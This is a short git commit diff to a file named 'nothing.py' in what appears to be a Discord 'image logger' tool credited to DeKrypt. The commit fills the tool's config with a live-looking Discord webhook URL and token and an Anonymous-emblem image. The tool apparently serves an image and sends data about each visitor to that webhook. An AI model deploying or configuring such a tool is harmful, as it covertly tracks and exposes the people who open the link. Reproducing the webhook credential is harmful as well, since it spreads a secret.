79ebe2f1fbf7c6168b723731de4a33dc1e5d1675
skids2 <alieniscool69s@gmail.com>
2025-02-27 13:40:35 -0500

    Update nothing.py

--- api/nothing.py
+++ api/nothing.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1344738840073736253/nz5pZoGSmAoLZPFu6F08HY8pTmMPXfCTH7v5AsrIlmDW78eaU3U07MZLTqRwIarnrduI",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
